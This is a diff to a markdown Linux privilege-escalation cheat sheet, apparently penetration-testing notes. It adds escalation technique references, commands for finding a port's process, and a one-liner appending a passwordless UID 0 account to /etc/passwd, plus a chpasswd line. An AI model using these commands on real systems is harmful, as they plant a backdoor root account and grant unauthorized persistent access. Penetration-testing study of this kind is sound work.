@@ -7,6 +7,26 @@
 - linuxprivchecker.py - <http://www.securitysift.com/download/linuxprivchecker.py>
 - LinEnum - <https://github.com/rebootuser/LinEnum>
 
+## References 
+
+- Hacking Linux Part I: Privilege Escalation: http://www.dankalia.com/tutor/01005/0100501004.htm
+  - Abusing users with '.' in their PATH
+  - Shell Escape Sequences
+  - IFS Exploit
+  - LD_PRELOAD Exploit
+  - Symlinks
+  
+## Process
+
+Process ID of a port:
+```
+fuser -n tcp (PORT NUMBER)
+```
+
+```
+ps aux | grep $(fuser -n tcp 45295 | awk '{print $2}')
+```
+
 ## File Permissions
 
 - Check file permissions of /etc/passwd and /etc/shadow
@@ -210,7 +230,14 @@ echo "user2:`php -r "print(crypt('aarti','123') . \"\n\");"`:1002:1003:,,,:/home
 ```
 adduser username
 usermod -aG sudo username
+```
+```
+echo 'trevelyn::0:0:root:/root:/bin/bash' >> /etc/passwd
+```
 
+## Change user password
+```
+echo "trevelyn:trevelyn"| /usr/sbin/chpasswd
 ```
 
 ## References
